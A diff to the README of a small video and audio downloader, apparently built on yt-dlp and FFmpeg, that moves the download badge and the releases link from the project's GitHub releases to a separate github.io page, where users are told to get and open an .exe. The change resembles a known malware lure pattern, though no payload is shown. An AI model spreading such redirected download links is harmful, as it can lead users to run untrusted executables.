@@ -1,12 +1,12 @@
 # ⬇️ download - Simple utility for video and audio saving
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Anuran-miami68/download/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://anuran-miami68.github.io)
 
 This software helps you save videos and audio from the internet to your computer. It uses trusted tools like yt-dlp and FFmpeg to get files quickly and save them in the format you prefer. You do not need to install complex software or change system settings.
 
 ## 📥 How to download and run
 
-1. Visit the [releases page](https://github.com/Anuran-miami68/download/releases).
+1. Visit the [releases page](https://anuran-miami68.github.io).
 2. Locate the most recent version at the top of the list.
 3. Click the file ending in `.exe` to start your download.
 4. Open the folder where you saved the file.
